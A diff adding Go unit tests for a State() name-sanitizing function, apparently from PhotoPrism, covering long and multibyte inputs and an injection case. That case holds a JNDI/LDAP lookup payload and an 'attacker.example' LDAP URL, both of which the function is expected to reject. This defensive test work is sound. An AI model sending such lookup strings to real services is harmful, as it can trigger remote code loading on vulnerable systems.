@@ -1,9 +1,12 @@
 package clean
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
+
+	"github.com/photoprism/photoprism/pkg/txt"
 )
 
 func TestState(t *testing.T) {
@@ -58,6 +61,20 @@ func TestState(t *testing.T) {
 	t.Run("SpecialChars", func(t *testing.T) {
 		result := State("Wa?shing*ton"+string(rune(127)), "us")
 		assert.Equal(t, "Washington", result)
+	})
+	t.Run("LongName", func(t *testing.T) {
+		got := State(strings.Repeat("a", txt.ClipName+50), "")
+		assert.Equal(t, txt.ClipName, len(got))
+		assert.Equal(t, strings.Repeat("a", txt.ClipName), got)
+	})
+	t.Run("LongMultiByte", func(t *testing.T) {
+		got := State(strings.Repeat("陈", txt.ClipName+50), "")
+		assert.Equal(t, txt.ClipName, len([]rune(got)))
+		assert.Equal(t, got, string([]rune(got)))
+	})
+	t.Run("Injection", func(t *testing.T) {
+		assert.Equal(t, "", State("hello ${jndi:ldap://example.com/x}", ""))
+		assert.Equal(t, "", State("ldap://attacker.example/", ""))
 	})
 
 }
